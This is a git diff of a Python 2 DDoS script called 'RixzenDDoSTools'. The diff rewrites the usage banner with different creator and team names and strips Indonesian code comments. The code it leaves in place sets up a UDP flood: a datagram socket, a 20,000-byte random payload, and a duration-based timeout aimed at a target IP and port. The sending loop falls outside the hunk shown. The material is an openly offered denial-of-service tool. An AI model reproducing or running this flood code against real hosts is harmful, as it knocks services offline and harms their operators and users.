@@ -3,21 +3,16 @@ import socket
 import random
 import sys
 def usage():
-    print "\033[1;32m############################################################"
-    print "#-----------------------------[\033[1;91mRIXZEN-DDoS\033[1;32m]----------------------------#"
-    print "#----------------------------------------------------------#"
-    print "#\033[1;91mGunakan: python2 RixzenDDoSTools.py <ip> <port> <packet> <duration> \033[1;32m #"
-    print "#                                                                               ##"
-    print "#\033[1;91mCreator  : Nathan562  \033[1;32m##      #      #                     ##"
-    print "#\033[1;91mTeam     : Rixzen     \033[1;32m##      #      #                     ##"
-    print "#\033[1;91mVersion  : 1.0        \033[1;32m##      #      #                     ##"
-    print "#\033[1;91mTQAdmin  : Nathan562, MasCreepy, Reyv   #      #                     ##"
-    print "############################################################"
+    print "######################################################################################"
+    print "#                             RIXZEN-DDoS-Tools                                     ##"
+    print "#Commands : python2 RixzenDDoSTools.py <ip> <port> <packet> <duration>              ##"
+    print "#Creator  : Mr.Erre               ##      #      #                                  ##"
+    print "#Team     : RixzenTeam            ##      #      #                                  ##"
+    print "#Version  : 1.0                   ##      #      #                                  ##"
+    print "#TQAdmin  : Mr.Erre, Mr., Mr.Tod                                                    ##"
+    print "######################################################################################"
 def flood(victim, vport, packet, duration):
-    # Support us yaakk... :)
-    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 20000 representasi satu byte ke server
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = packet
